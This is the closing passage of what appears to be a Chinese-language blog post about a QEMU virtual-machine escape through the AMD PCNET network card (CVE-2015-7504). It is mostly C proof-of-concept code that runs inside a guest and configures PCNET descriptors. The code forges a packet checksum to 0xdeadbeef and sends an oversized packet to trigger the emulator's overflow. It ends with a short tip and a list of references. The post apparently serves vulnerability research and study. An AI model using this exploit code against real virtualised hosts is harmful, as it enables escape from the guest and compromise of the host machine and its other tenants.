</span></span></span><span class=line><span class=cl><span class=cm>	offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;
</span></span></span><span class=line><span class=cl><span class=cm>	lseek(fd, offset, SEEK_SET);
</span></span></span><span class=line><span class=cl><span class=cm>	read(fd, &amp;pme, 8);
</span></span></span><span class=line><span class=cl><span class=cm>	if (!(pme &amp; PFN_PRESENT))
</span></span></span><span class=line><span class=cl><span class=cm>		return -1;
</span></span></span><span class=line><span class=cl><span class=cm>	gfn = pme &amp; PAGE_PFN;
</span></span></span><span class=line><span class=cl><span class=cm>	return gfn;
</span></span></span><span class=line><span class=cl><span class=cm>}
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>uint64_t gva_to_gpa(void *addr)
</span></span></span><span class=line><span class=cl><span class=cm>{
</span></span></span><span class=line><span class=cl><span class=cm>	uint64_t gfn = gva_to_gfn(addr);
</span></span></span><span class=line><span class=cl><span class=cm>	assert(gfn != -1);
</span></span></span><span class=line><span class=cl><span class=cm>	return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);
</span></span></span><span class=line><span class=cl><span class=cm>}
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pcnet_desc_config</span><span class=p>(</span><span class=k>struct</span> <span class=n>pcnet_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=kt>int</span> <span class=n>is_rx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>bcnt</span> <span class=o>=</span> <span class=o>-</span><span class=n>PCNET_BUFFER_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>bcnt</span> <span class=o>&amp;=</span> <span class=mh>0xfff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>bcnt</span> <span class=o>|=</span> <span class=mh>0xf000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>desc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>pcnet_desc</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>PCNET_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>length</span> <span class=o>=</span> <span class=n>bcnt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>is_rx</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// receive buffers owned by the card
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>desc</span><span class=o>-&gt;</span><span class=n>status_2</span> <span class=o>=</span> <span class=mh>0x80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>desc</span><span class=o>-&gt;</span><span class=n>status_2</span> <span class=o>=</span> <span class=mh>0x83</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>pcnet_card_config</span><span class=p>(</span><span class=k>struct</span> <span class=n>pcnet_config32</span> <span class=o>*</span><span class=n>config</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=k>struct</span> <span class=n>pcnet_desc</span>  <span class=o>*</span><span class=n>tx_desc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=k>struct</span> <span class=n>pcnet_desc</span>  <span class=o>*</span><span class=n>rx_desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>config</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>pcnet_config32</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>config</span><span class=o>-&gt;</span><span class=n>mode</span> <span class=o>=</span> <span class=n>LOOP</span> <span class=o>|</span> <span class=n>PROM</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>config</span><span class=o>-&gt;</span><span class=n>tx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>tx_desc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>config</span><span class=o>-&gt;</span><span class=n>rx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>rx_desc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>config</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// PCNET primitives
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>pcnet_packet_patch_crc</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>packet</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>current</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=kt>uint32_t</span> <span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint32_t</span> <span class=n>workspace</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=n>current</span><span class=p>,</span> <span class=n>target</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>workspace</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=o>~</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>workspace</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>while</span><span class=p>(</span><span class=n>crctab</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=n>ptr</span> <span class=o>+</span> <span class=mi>3</span> <span class=o>-</span> <span class=n>i</span><span class=p>))</span> <span class=n>j</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>ptr</span> <span class=o>-</span> <span class=n>i</span><span class=p>))</span> <span class=o>^=</span> <span class=n>crctab</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=p>(</span><span class=n>ptr</span> <span class=o>-</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^=</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>strncpy</span><span class=p>(</span><span class=n>packet</span><span class=p>,</span> <span class=n>ptr</span> <span class=o>-</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pcnet_packet_send</span><span class=p>(</span><span class=k>struct</span> <span class=n>pcnet_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                       <span class=kt>void</span> <span class=o>*</span><span class=n>packet</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>len</span> <span class=o>&lt;=</span> <span class=n>PCNET_BUFFER_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>packet</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>desc</span><span class=o>-&gt;</span><span class=n>status_2</span> <span class=o>|=</span> <span class=mh>0x23</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>=</span> <span class=o>-</span><span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>&amp;=</span> <span class=mh>0xfff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>|=</span> <span class=mh>0xf000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>desc</span><span class=o>-&gt;</span><span class=n>length</span> <span class=o>=</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// flip ownership to card
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>desc</span><span class=o>-&gt;</span><span class=n>status_2</span> <span class=o>|=</span> <span class=mh>0x80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// send packet
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>outw</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>outw</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// fd = open(&#34;/proc/self/pagemap&#34;, O_RDONLY);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pcnet_config32</span> <span class=n>pcnet_config</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>pcnet_config_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>pcnet_tx_desc_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>pcnet_rx_desc_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pcnet_desc</span> <span class=n>pcnet_tx_desc</span> <span class=n>PAGE_ALIGNED</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pcnet_desc</span> <span class=n>pcnet_rx_desc</span> <span class=n>PAGE_ALIGNED</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>pcnet_tx_buffer</span><span class=p>,</span> <span class=o>*</span><span class=n>pcnet_rx_buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>fcs</span> <span class=o>=</span> <span class=o>~</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span>  <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint16_t</span> <span class=n>lo</span><span class=p>,</span> <span class=n>hi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>PCNET_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pcnet_tx_buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>PCNET_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pcnet_rx_buffer</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>pcnet_desc_config</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_tx_desc</span><span class=p>,</span> <span class=n>pcnet_tx_buffer</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pcnet_desc_config</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_rx_desc</span><span class=p>,</span> <span class=n>pcnet_rx_buffer</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pcnet_config_mem</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>pcnet_card_config</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_config</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                   <span class=o>&amp;</span><span class=n>pcnet_tx_desc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                   <span class=o>&amp;</span><span class=n>pcnet_rx_desc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pcnet_tx_desc_mem</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_tx_desc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pcnet_rx_desc_mem</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_rx_desc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lo</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint16_t</span><span class=p>)</span><span class=n>pcnet_config_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>hi</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint16_t</span><span class=p>)(</span><span class=n>pcnet_config_mem</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// compute required crc
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ptr</span> <span class=o>=</span> <span class=n>pcnet_packet</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>ptr</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>pcnet_packet</span><span class=p>[</span><span class=n>PCNET_BUFFER_SIZE</span> <span class=o>-</span> <span class=mi>4</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>CRC</span><span class=p>(</span><span class=n>fcs</span><span class=p>,</span> <span class=o>*</span><span class=n>ptr</span><span class=o>++</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>pcnet_packet_patch_crc</span><span class=p>(</span><span class=n>ptr</span><span class=p>,</span> <span class=n>fcs</span><span class=p>,</span> <span class=nf>htonl</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// soft reset
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>inw</span><span class=p>(</span><span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// set software style
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>58</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mh>0x102</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// card config
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span>  <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=n>lo</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span>  <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=n>hi</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//CSR_DPOLL
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// init and start
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//set CSR_SPND
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mh>0x1</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//CSR_PROM
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mh>0x8004</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//CSR_CRST
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>41</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RAP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mh>0x8000</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=n>RDP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//clear CSR_SPND
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>outw</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=mh>0x12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>PCNET_PORT</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pcnet_packet_send</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pcnet_tx_desc</span><span class=p>,</span> <span class=n>pcnet_tx_buffer</span><span class=p>,</span> <span class=n>pcnet_packet</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>PCNET_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tips>tips<a hidden class=anchor aria-hidden=true href=#tips>#</a></h2><p>下面这个命令可以查看设备与网卡的对应关系</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ls -l /sys/class/net
</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2><ol><li><a href=http://www.phrack.org/papers/vm-escape-qemu-case-study.html>VM escape QEMU Case Study</a></li><li><a href=http://jiayy.me/2019/04/15/CVE-2015-5165-7504/#cve-2015-7504-bug>qemu逃逸漏洞解析</a></li><li><a href=https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-7504>Resery/Virtualized_Learning</a></li><li><a href=https://wiki.osdev.org/AMD_PCNET>AMD PCNET osdev.org</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/qemu/>Qemu</a></li><li><a href=https://hhdx.xyz/tags/cve/>CVE</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>